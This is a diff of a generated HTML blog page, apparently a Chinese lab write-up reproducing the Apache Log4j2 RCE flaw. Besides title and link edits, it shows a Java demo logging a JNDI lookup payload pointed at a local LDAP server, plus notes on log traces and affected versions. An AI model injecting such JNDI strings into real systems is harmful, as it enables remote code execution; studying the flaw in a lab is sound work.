@@ -59,7 +59,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-Apache Log4j2RCE漏洞复现"
+  id="post-Apache Log4j2 RCE漏洞复现"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -78,7 +78,7 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2021/12/11/Apache%20Log4j2RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
+      <a href="/2021/12/11/Apache%20Log4j2%20RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
   <time datetime="2021-12-11T12:32:03.000Z" itemprop="datePublished">2021-12-11</time>
 </a> 
   <div class="article-category">
@@ -90,7 +90,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">791</span>
+            <span class="post-count">788</span>
         </span>
     </span>
 
@@ -128,16 +128,16 @@
 
 
 <p>点击下载相应程序包资源</p>
-<p>![image-20211210134809897](Apache Log4j2 RCE漏洞复现&#x2F;image-20211210134809897.png)</p>
+<p>![image-20211210134809897](Apache Log4j2RCE漏洞复现&#x2F;image-20211210134809897.png)</p>
 <p>这里使用JNDI注入工具开启rmi服务或者idap服务执行本地命令，如下:</p>
-<p>![](Apache Log4j2 RCE漏洞复现&#x2F;image-20211210135143848.png)</p>
+<p>![](Apache Log4j2RCE漏洞复现&#x2F;image-20211210135143848.png)</p>
 <p>下面为测试Demo(由于我的jdk版本不适用RMI-JDNI注入，这里使用的是ldap协议)</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(Test.class);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/ehm23c&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
 
 <p>运行结果:</p>
-<p>![](Apache Log4j2 RCE漏洞复现&#x2F;image-20211210135519958.png)</p>
+<p>![](Apache Log4j2RCE漏洞复现&#x2F;image-20211210135519958.png)</p>
 <h2 id="痕迹分析"><a href="#痕迹分析" class="headerlink" title="痕迹分析"></a>痕迹分析</h2><p>主要查看日志，观察日志中是否存在错误记录</p>
 <h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>经验证 2.15.0-rc1 版本存在绕过，实际受影响范围如下：</p>
 <p>Apache Log4j 2.x &lt; 2.15.0-rc2</p>
@@ -236,7 +236,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2021/12/11/Apache%20Log4j2RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2021/12/11/Apache%20Log4j2%20RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -249,19 +249,19 @@
    
   <nav class="article-nav">
     
-      <a href="/2021/12/11/Apache%20Log4j2%20RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
+      <a href="/2022/01/17/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            Apache Log4j2RCE漏洞复现
+            (no title)
           
         </div>
       </a>
     
     
-      <a href="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" class="article-nav-link">
+      <a href="/2021/12/11/Apache%20Log4j2RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">MSSQL注入学习</div>
+        <div class="article-nav-title">Apache Log4j2RCE漏洞复现</div>
       </a>
     
   </nav>
